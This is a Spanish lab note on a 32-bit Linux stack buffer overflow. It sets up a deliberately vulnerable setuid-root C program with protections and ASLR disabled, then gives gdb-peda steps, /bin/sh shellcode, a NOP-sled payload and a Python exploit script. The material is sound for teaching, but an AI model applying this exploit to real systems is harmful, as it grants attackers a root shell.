**EXPLICACÍON DETALLADA EN** [Buffer Overflow 32 Bits Linux](https://hacknotes.github.io/buffer%20overflow/buff32linux/)

## Script
```bash
#include <stdio.h>
#include <string.h>

int vuln(char *str)
{
    char buf[64];
    strcpy(buf,str);
    printf("Cadena: %s\n",buf);
    return 0;
}
int main(int argc, char* argv[])
{
    vuln(argv[1]);
}
```

## Compilacion

 ```bash
gcc -g -fno-stack-protector -z execstack -m32 buff.c -o buff
```

## Permisos
 
```bash
 chown root:root buff
 chmod +s buff
 echo 0 > /proc/sys/kernel/randomize_va_space
```
 
 ## GDB-Peda

Vemos los registros de la memoria
**Comando:** 
 ```bash
 i r
 ```
 
Crea cadenas aleatorias
 **Comando:**
 ```bash
 pattern arg 100
 ```
 
 Ejecuta el binario
 **Comando:**
 ```bash
 r
 ```
 
Encuentra el tamaño del offset.
 **Comando:**
 ```bash
 pattern search
 ```
 
 Ver los ultimos 100 registros de la pila.
 **Comando:**
 ```bash
 x/100wx $esp
 ```
 Nobs (no operate code).
 ```bash
 \x90
 ```
 
 Shell
 ```bash
 "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 ```
 
 Payload final
 ```bash
 $(python -c 'print "A"*76 + "\xa0\xef\xff\xbf" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
```
Script en python
```python
#!/usr/bin/python

from struct import pack

if __name__=='__main__':

        offset = 76
        junk = "A"*offset
        EIP = pack("<I", 0xbfffefa0)
        nops = "\x90"*100
        shell= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

payload = junk + EIP + nops + shell

print payload
```
